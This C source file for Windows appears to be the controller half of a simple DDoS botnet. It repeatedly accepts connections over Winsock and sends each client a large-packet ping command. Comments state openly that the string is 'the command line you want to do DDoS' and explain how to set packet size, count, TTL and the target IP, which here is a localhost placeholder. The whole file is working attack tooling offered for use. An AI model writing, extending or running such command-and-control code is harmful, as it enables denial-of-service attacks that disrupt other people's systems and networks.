#include <stdio.h>
#include <winsock2.h>


#pragma comment (lib, "ws2_32.lib")  //Load ws2_32.dll
int main() {
    //Initialize DLL
    while (1) {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        //Create the socket
        SOCKET servSock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
        //Set the socket
        sockaddr_in sockAddr;
        memset(&sockAddr, 0, sizeof(sockAddr));  //All bits are set 0
        sockAddr.sin_family = PF_INET;  //To use IPv4 address
        sockAddr.sin_addr.s_addr = inet_addr("127.0.0.1");  //Your server IP Address
        sockAddr.sin_port = htons(1234);  //Your IP Port
        bind(servSock, (SOCKADDR*)&sockAddr, sizeof(SOCKADDR));
        //Listen
        listen(servSock, 20);
        
        //Accept the connect
        SOCKADDR clntAddr;
        
        int nSize = sizeof(SOCKADDR);
        SOCKET clntSock = accept(servSock, (SOCKADDR*)&clntAddr, &nSize);
        
        //Send the command to the client

        //This is the command line you want to do DDoS. The command of the ping is "ping -l (The size of the packet you want to ping) (The ip you want to do DDoS) -n (The packet you want to ping in a iteration) -i (The TTL of this packet)"
        //For example, "ping -l 65500 127.0.0.1 -n 1 -i 255"
        char s[] = "ping -l 65500 127.0.0.1 -n 1 -i 255";
        //char s[] = "stop";
        char* str = s;
        char szBuffer[MAXBYTE] = { 0 };
        //recv(clntSock, szBuffer, MAXBYTE, NULL);
        //cout << szBuffer << endl;
        send(clntSock, str, strlen(str) + sizeof(char), NULL);
        //關閉套接字
        closesocket(clntSock);
        closesocket(servSock);
        //終止 DLL 的使用
        WSACleanup();
    }
    return 0;
}
